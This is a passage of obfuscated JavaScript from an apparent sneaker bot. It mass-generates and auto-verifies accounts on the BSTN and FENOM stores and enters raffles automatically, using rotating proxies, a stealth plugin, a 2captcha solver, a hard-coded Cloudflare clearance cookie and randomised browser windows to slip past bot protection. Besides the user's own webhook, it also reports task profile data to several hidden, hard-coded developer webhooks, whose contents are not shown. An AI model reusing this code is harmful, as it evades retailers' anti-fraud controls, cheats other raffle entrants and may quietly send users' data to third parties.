                            }), console['log'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x594a30['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x594a30['setRequestInterception'](!![]), _0x594a30['on']('request', _0x4add26 => {
                                _0x4add26['resourceType']() === 'image' ? _0x4add26['abort']() : _0x4add26['continue']();
                            }), await _0x594a30['goto']('' + _0x200448), await _0x594a30['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x594a30['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x63444f(0x7d0), console['log'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x63444f(0x190), await _0x594a30['waitForSelector']('#firstname'), await _0x594a30['type']('#firstname', _0x1f1f85[_0x56309d]['FirstName'], { 'delay': 0xf0 }), await _0x63444f(0x190), await _0x594a30['type']('#lastname', _0x1f1f85[_0x56309d]['LastName'], { 'delay': 0xe6 }), await _0x63444f(0x190), await _0x594a30['type']('#email_address', _0x1f1f85[_0x56309d]['Email'], { 'delay': 0x122 }), await _0x63444f(0x190), await _0x594a30['type']('#password', _0x1f1f85[_0x56309d]['Password'], { 'delay': 0x82 }), await _0x63444f(0x1f4), await _0x594a30['type']('#password-confirmation', _0x1f1f85[_0x56309d]['Password'], { 'delay': 0x7c }), console['log'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20Sending\x20Request'), await _0x63444f(0x2bc), await _0x594a30['$eval']('#form-validate', _0x4df83c => _0x4df83c['submit']()), await _0x63444f(0x1388);
                            const _0x1ab8a9 = await _0x594a30['$']('#email_address-error');
                            if (_0x1ab8a9)
                                throw new Error('Invalid\x20Email');
                            const _0x1a71b5 = await _0x594a30['$']('#password-error');
                            if (_0x1a71b5)
                                throw new Error('Invalid\x20Password');
                            await _0x594a30['waitForSelector']('div.mesg-success'), _0x574eec = 'no', console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20Account\x20' + _0x1f1f85[_0x56309d]['Email'] + '\x20Generated')), _0x442555['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x1f1f85[_0x56309d]['Email'] + ',' + _0x1f1f85[_0x56309d]['Password']);
                            try {
                                _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x48e401['succesDEVMSG']);
                            } catch {
                            }
                            await _0x584f8b(_0x214943, _0x48e401['succesDEVMSG']), console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x334332) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20' + _0x334332)), _0x14cf78 = '' + _0x334332;
                            var _0x33b0b2 = await _0x4d9326(_0x1f1f85[_0x56309d], _0x45b13b, 'acc', !![], _0x14cf78);
                            _0x48e401['errorDEV'] = { 'embeds': [_0x33b0b2] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x48e401['errorDEV']), await _0x584f8b(_0x437fba, _0x48e401['errorDEV']), _0x574eec = 'yes';
                        } finally {
                            _0x1a4960['close']();
                            if (_0x574eec == 'yes' && _0x2c4474 != 0x5) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Task\x20' + (_0x56309d + 0x1) + '\x20:\x20Retrying')), _0x56309d = _0x56309d - 0x1, _0x2c4474 = _0x2c4474 + 0x1;
                                continue;
                            }
                            _0x574eec == 'yes' && _0x2c4474 >= 0x5 && (_0x1d0bc0(_0x1f1f85[_0x56309d], _0x45b13b), _0x574eec = 'no', _0x2c4474 = 0x0), console['log'](_0x46d913() + '\x20[' + _0x45b13b['name'] + ']\x20Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x3a2770, _0xc594c9) {
                    var _0x18b85f = [];
                    async function _0x217672() {
                        var _0x10e508 = new _0x2021ac({
                            'user': _0xb4964b['masterMail'],
                            'password': _0xb4964b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x47cfc6(_0x36500d) {
                            _0x10e508['openBox']('INBOX', ![], _0x36500d);
                        }
                        _0x10e508['once']('ready', function () {
                            _0x47cfc6(function (_0x17a4be, _0x20c9a0) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x17a4be)
                                    throw _0x17a4be;
                                _0x10e508['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'FROM',
                                        'no-reply@store.bstn.com'
                                    ]
                                ], function (_0x3678b7, _0x26b31e) {
                                    if (!_0x26b31e || !_0x26b31e['length'])
                                        console['log'](_0x46d913() + '\x20[' + _0x3a2770['name'] + ']\x20No\x20mails\x20found'), _0x10e508['end']();
                                    else {
                                        var _0xeb7b74 = _0x10e508['seq']['fetch'](_0x26b31e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xeb7b74['on']('message', function (_0x1080c5, _0x1d052b) {
                                            var _0x3b0b63 = '(#' + _0x1d052b + ')\x20';
                                            _0x1080c5['on']('body', function (_0x2ce512, _0x44f784) {
                                                _0x22cc54(_0x2ce512, (_0x45d69b, _0x171234) => {
                                                    if (_0x171234['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x558425 = _0x171234['text']['split']('[')[0x2], _0x248aec = _0x558425['split'](']')[0x0], _0x59d1bd = _0x171234['html']['split']('\x0a');
                                                        _0x18b85f['push'](_0x248aec);
                                                    }
                                                });
                                            }), _0x1080c5['once']('end', function () {
                                            });
                                        }), _0xeb7b74['once']('error', function (_0x185fbe) {
                                            console['log']('Fetch\x20error:\x20' + _0x185fbe);
                                        }), _0xeb7b74['once']('end', function () {
                                            _0x10e508['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x10e508['once']('error', function (_0xd4dfba) {
                            console['log'](_0x580fd6['red'](_0xd4dfba['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x10e508['once']('end', async function () {
                        }), _0x10e508['connect']();
                    }
                    async function _0x4665eb(_0x52191a, _0x25a704, _0x5066ca) {
                        _0x5e99b4['use'](_0x352eb4());
                        for (var _0xf3ca7f = 0x0; _0xf3ca7f < _0x25a704['length']; _0xf3ca7f++) {
                            if (_0x462430 != 'yes')
                                var _0x462430 = '', _0x32c4d6 = 0x0;
                            var _0x87ac60 = Math['round'](Math['random']() * (_0x5066ca['length'] - 0x1)), _0x2d24ba = _0x5066ca[_0x87ac60]['split'](':');
                            const _0x13296c = await _0x5e99b4['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d24ba[0x0] + ':' + _0x2d24ba[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x61a776 = await _0x13296c['newPage']();
                                await _0x61a776['authenticate']({
                                    'username': '' + _0x2d24ba[0x2],
                                    'password': '' + _0x2d24ba[0x3]
                                }), console['log'](_0x46d913() + '\x20[' + _0x52191a['name'] + ']\x20Task\x20' + (_0xf3ca7f + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x61a776['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x61a776['setRequestInterception'](!![]), _0x61a776['on']('request', _0x7e5f0d => {
                                    _0x7e5f0d['resourceType']() === 'image' || _0x7e5f0d['resourceType']() === 'font' || _0x7e5f0d['resourceType']() === 'media' ? _0x7e5f0d['abort']() : _0x7e5f0d['continue']();
                                }), console['log'](_0x46d913() + '\x20[' + _0x52191a['name'] + ']\x20Task\x20' + (_0xf3ca7f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x61a776['goto'](_0x25a704[_0xf3ca7f]), console['log'](_0x46d913() + '\x20[' + _0x52191a['name'] + ']\x20Task\x20' + (_0xf3ca7f + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x61a776['waitForTimeout'](0xbb8);
                                try {
                                    await _0x61a776['waitForSelector']('.account-nav'), _0x462430 = 'no', console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x52191a['name'] + ']\x20Task\x20' + (_0xf3ca7f + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x3a5572 = await _0x4d9326(null, _0x52191a, 'ver', ![]);
                                    const _0x193d04 = { 'succesDEVMSG': { 'embeds': [_0x3a5572] } };
                                    await _0x584f8b(_0x567e0b, _0x193d04['succesDEVMSG']);
                                } catch (_0x188551) {
                                    throw new Error(_0x188551);
                                }
                            } catch (_0x50ebb5) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x52191a['name'] + ']\x20Task\x20' + (_0xf3ca7f + 0x1) + '\x20:\x20' + _0x50ebb5));
                                var _0x21f346 = _0x50ebb5, _0x5c4787 = await _0x4d9326(null, _0x52191a, 'ver', !![], _0x21f346);
                                const _0x3f55c5 = { 'errorDEVMSG': { 'embeds': [_0x5c4787] } };
                                _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x3f55c5['errorDEVMSG']), await _0x584f8b(_0x437fba, _0x3f55c5['errorDEVMSG']), _0x462430 = 'yes';
                            } finally {
                                _0x13296c['close']();
                                if (_0x462430 == 'yes' && _0x32c4d6 != 0x5) {
                                    console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x52191a['name'] + ']\x20Task\x20' + (_0xf3ca7f + 0x1) + '\x20:\x20Retrying')), _0xf3ca7f = _0xf3ca7f - 0x1, _0x32c4d6 = _0x32c4d6 + 0x1;
                                    continue;
                                }
                                _0x462430 == 'yes' && _0x32c4d6 >= 0x5 && (_0x462430 = 'no', _0x32c4d6 = 0x0), console['log'](_0x46d913() + '\x20[' + _0x52191a['name'] + ']\x20Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                            }
                        }
                    }
                    try {
                        _0x217672(), await _0x63444f(0xfa0), console['log']('Found\x20' + _0x18b85f['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x63444f(0x7d0);
                    }
                    await _0x4665eb(_0x3a2770, _0x18b85f, _0xc594c9);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x58282e, _0x1af254, _0xf4a354) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xf8f6a5 = 0x0; _0xf8f6a5 < _0x1af254['length']; _0xf8f6a5++) {
                        var _0x3a34f1;
                        await _0x1713f8(_0x1af254, _0xf8f6a5);
                        if (_0x1f0797 != 'yes')
                            var _0x1f0797 = '', _0x1106e4 = 0x0;
                        _0x40199d(_0x58282e['name'] + '\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20/\x20' + _0x1af254['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec);
                        var _0x4f0d79 = Math['round'](Math['random']() * (_0xf4a354['length'] - 0x1)), _0x171c6b = _0xf4a354[_0x4f0d79]['split'](':'), _0x4b4402;
                        try {
                            _0x4b4402 = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x171c6b[0x0] + ':' + _0x171c6b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b4402 = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x171c6b[0x0] + ':' + _0x171c6b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x15fd1b = await _0x4b4402['newPage'](), _0x3504fa = await _0x15fd1b['target']()['createCDPSession'](), { windowId: _0x263630 } = await _0x3504fa['send']('Browser.getWindowForTarget');
                            await _0x15fd1b['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x2cfb68 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x15fd1b['authenticate']({
                                'username': '' + _0x171c6b[0x2],
                                'password': '' + _0x171c6b[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x15fd1b['goto']('' + _0x1af254[_0xf8f6a5]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x15fd1b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x3504fa['send']('Browser.setWindowBounds', {
                                'windowId': _0x263630,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x63444f(0x1388), await _0x15fd1b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x15fd1b['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x63444f(0x1f4), console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Logging\x20in'), await _0x15fd1b['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x58933d => _0x58933d['click']()), await _0x15fd1b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x15fd1b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x63444f(0x7d0), await _0x15fd1b['waitForSelector']('#email-login'), await _0x15fd1b['type']('#email-login', '' + _0x1af254[_0xf8f6a5]['Email']), await _0x63444f(0xdac), await _0x15fd1b['waitForSelector']('#password'), await _0x15fd1b['type']('#password', '' + _0x1af254[_0xf8f6a5]['Password'], { 'delay': 0xe6 }), await _0x63444f(0x157c);
                            try {
                                await _0x15fd1b['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x48defa => _0x48defa['click']());
                            } catch {
                            }
                            try {
                                await _0x15fd1b['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x251398) {
                            }
                            await _0x63444f(0x3e8);
                            const _0x2689f7 = await _0x15fd1b['$']('.enteredDraw_container__2KmQ_');
                            if (_0x2689f7)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1af254[_0xf8f6a5]['Size']);
                            if (_0x1af254[_0xf8f6a5]['Size'] != 'RANDOM') {
                                var _0xe1057d = _0x1af254[_0xf8f6a5]['Size']['replace']('.', ',');
                                const _0x8eb950 = await _0x15fd1b['$x']('//div[contains(text(),\x20' + _0xe1057d + ')]');
                                await _0x8eb950[0x0]['click']();
                            } else {
                                const _0x46b9e6 = await _0x15fd1b['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x2d4962 = Math['round'](Math['random']() * (_0x46b9e6['length'] - 0x1));
                                await _0x46b9e6[_0x2d4962]['click']();
                            }
                            await _0x63444f(0x1f4);
                            const _0x2e5283 = await _0x15fd1b['$']('.addressList_addressItem__LE2PB');
                            if (_0x2e5283 && _0x1af254[_0xf8f6a5]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x15fd1b['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x63444f(0x5dc), await _0x15fd1b['waitForSelector']('#firstname'), await _0x15fd1b['type']('#firstname', '' + _0x1af254[_0xf8f6a5]['FirstName']), await _0x63444f(0x1f4), await _0x15fd1b['waitForSelector']('#firstname'), await _0x15fd1b['type']('#lastname', '' + _0x1af254[_0xf8f6a5]['LastName']), await _0x63444f(0x1f4), await _0x15fd1b['waitForSelector']('#firstname'), await _0x15fd1b['type']('#street', '' + _0x1af254[_0xf8f6a5]['Address1']), await _0x63444f(0x1f4), await _0x15fd1b['waitForSelector']('#firstname'), await _0x15fd1b['type']('#houseNumber', _0x1af254[_0xf8f6a5]['HouseNumber'] + '\x20' + _0x1af254[_0xf8f6a5]['Address2']), await _0x63444f(0x1f4), await _0x15fd1b['waitForSelector']('#firstname'), await _0x15fd1b['select']('#country_code', '' + _0x1af254[_0xf8f6a5]['Country']), await _0x63444f(0x1f4), await _0x15fd1b['type']('#postcode', '' + _0x1af254[_0xf8f6a5]['Zip']), await _0x63444f(0x1f4), await _0x15fd1b['type']('#city', '' + _0x1af254[_0xf8f6a5]['City']), await _0x63444f(0x1f4), await _0x15fd1b['type']('#telephone', '' + _0x1af254[_0xf8f6a5]['Phone']), await _0x63444f(0x1f4), await _0x15fd1b['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x63444f(0x9c4);
                            try {
                                await _0x15fd1b['type']('#instagram_name', '' + _0x1af254[_0xf8f6a5]['Follower']), await _0x15fd1b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x63444f(0x5dc);
                            try {
                                await _0x15fd1b['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x63444f(0x5dc), await _0x15fd1b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x247eb7 => _0x247eb7['click']()), await _0x63444f(0x1388);
                            try {
                                await _0x15fd1b['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x15fd1b['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x1af254[_0xf8f6a5]['Size'] != 'RANDOM') {
                                    var _0xe1057d = _0x1af254[_0xf8f6a5]['Size']['replace']('.', ',');
                                    const _0x2b00b3 = await _0x15fd1b['$x']('//div[contains(text(),\x20' + _0xe1057d + ')]');
                                    await _0x2b00b3[0x0]['click']();
                                } else {
                                    const _0x3b221c = await _0x15fd1b['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x2d4962 = Math['round'](Math['random']() * (_0x3b221c['length'] - 0x1));
                                    await _0x3b221c[_0x2d4962]['click']();
                                }
                                await _0x63444f(0x5dc);
                                try {
                                    await _0x15fd1b['hover']('#instagram_name'), await _0x15fd1b['type']('#instagram_name', '' + _0x1af254[_0xf8f6a5]['Follower']), await _0x15fd1b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Retrying'), await _0x15fd1b['hover']('.checkBox_boxHolder__wLGVe'), await _0x63444f(0x5dc), await _0x15fd1b['click']('.checkBox_boxHolder__wLGVe'), await _0x63444f(0x157c), await _0x15fd1b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x17b6d0 => _0x17b6d0['click']()), await _0x63444f(0x1388), await _0x15fd1b['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x1f0797 = 'no', _0xa2d2c6(_0x1af254[_0xf8f6a5], _0x58282e), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x231ad0 = await _0x4d9326(_0x1af254[_0xf8f6a5], _0x58282e, 'dev', ![]), _0x390e63 = await _0x4d9326(_0x1af254[_0xf8f6a5], _0x58282e, 'pub', ![]);
                            const _0x1532fa = {
                                'succesDEVMSG': { 'embeds': [_0x231ad0] },
                                'succesPUBMSG': { 'embeds': [_0x390e63] }
                            };
                            try {
                                _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x1532fa['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x1532fa['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0x3501b6, _0x1532fa['succesPUBMSG']);
                            } catch (_0x4e6d88) {
                                console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4e6d88));
                            }
                        } catch (_0x59b011) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20' + _0x59b011)), _0x1f0797 = 'yes', _0x3a34f1 = '' + _0x59b011;
                            var _0x58b672 = await _0x4d9326(_0x1af254[_0xf8f6a5], _0x58282e, 'dev', !![], _0x3a34f1), _0x231ad0 = await _0x4d9326(_0x1af254[_0xf8f6a5], _0x58282e, 'dev', ![]), _0x390e63 = await _0x4d9326(_0x1af254[_0xf8f6a5], _0x58282e, 'pub', ![]);
                            const _0x1a6f4c = {
                                'succesDEVMSG': { 'embeds': [_0x231ad0] },
                                'succesPUBMSG': { 'embeds': [_0x390e63] }
                            };
                            _0x1a6f4c['errorDEV'] = { 'embeds': [_0x58b672] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x1a6f4c['errorDEV']), await _0x584f8b(_0x437fba, _0x1a6f4c['errorDEV']);
                        } finally {
                            _0x4b4402['close']();
                            if (_0x1f0797 == 'yes' && _0x1106e4 != 0x5) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Task\x20' + (_0xf8f6a5 + 0x1) + '\x20:\x20Retrying')), _0xf8f6a5 = _0xf8f6a5 - 0x1, _0x1106e4 = _0x1106e4 + 0x1;
                                continue;
                            }
                            _0x1f0797 == 'yes' && _0x1106e4 >= 0x5 && (_0x1d0bc0(_0x1af254[_0xf8f6a5], _0x58282e), _0x1f0797 = 'no', _0x1106e4 = 0x0), console['log'](_0x46d913() + '\x20[' + _0x58282e['name'] + ']\x20Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x198b2b, _0x38d961, _0x2eb7b4) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x15315b = 0x0; _0x15315b < _0x38d961['length']; _0x15315b++) {
                        if (_0xe8c827 != 'yes')
                            var _0xe8c827 = '', _0x3459d1 = 0x0;
                        var _0x505a3f;
                        await _0x1713f8(_0x38d961, _0x15315b), _0x40199d(_0x198b2b['name'] + '\x20Task\x20' + (_0x15315b + 0x1) + '\x20/\x20' + _0x38d961['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec);
                        var _0x55ab00 = await _0x4d9326(_0x38d961[_0x15315b], _0x198b2b, 'acc', ![]);
                        const _0x30de4c = { 'succesDEVMSG': { 'embeds': [_0x55ab00] } }, _0x5c886e = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x20e798 = Math['round'](Math['random']() * (_0x2eb7b4['length'] - 0x1)), _0x2da758 = _0x2eb7b4[_0x20e798]['split'](':'), _0x3577ee;
                        try {
                            _0x3577ee = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2da758[0x0] + ':' + _0x2da758[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3577ee = await _0x5e99b4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2da758[0x0] + ':' + _0x2da758[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4b7841 = await _0x3577ee['newPage']();
                            await _0x4b7841['setViewport']({
                                'width': 0x500 + _0x387c48(0x1, 0x32),
                                'height': 0x2d9 + _0x387c48(0x1, 0x32)
                            });
                            const _0x45dd83 = await _0x4b7841['target']()['createCDPSession'](), { windowId: _0x50c383 } = await _0x45dd83['send']('Browser.getWindowForTarget');
                            await _0x4b7841['authenticate']({
                                'username': '' + _0x2da758[0x2],
                                'password': '' + _0x2da758[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Task\x20' + (_0x15315b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4b7841['goto']('' + _0x5c886e, { 'waitUntil': 'networkidle2' }), await _0x63444f(0x1388), console['log'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Task\x20' + (_0x15315b + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0xf541bb = await _0x4b7841['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0xf541bb && await _0xf541bb['click']();
                            } catch {
                            }
                            await _0x45dd83['send']('Browser.setWindowBounds', {
                                'windowId': _0x50c383,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x4b7841['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x63444f(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Task\x20' + (_0x15315b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4b7841['type']('input[name=\x22firstname\x22]', '' + _0x38d961[_0x15315b]['FirstName']), await _0x63444f(0x1f4), await _0x4b7841['type']('input[name=\x22lastname\x22]', '' + _0x38d961[_0x15315b]['LastName']), await _0x63444f(0x1f4), await _0x4b7841['type']('input[name=\x22email\x22]', '' + _0x38d961[_0x15315b]['Email']), await _0x63444f(0x1f4), await _0x4b7841['type']('input[name=\x22password\x22]', '' + _0x38d961[_0x15315b]['Password']), await _0x63444f(0x258), await _0x4b7841['$eval']('input[name=\x22psgdpr\x22]', _0x399d2e => _0x399d2e['click']()), await _0x63444f(0x1f4), console['log'](_0x46d913() + '\x20[' + _0x198b2b['name'] + ']\x20Task\x20' + (_0x15315b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4b7841['$eval']('#customer-form', _0x280c17 => _0x280c17['submit']());
                            try {
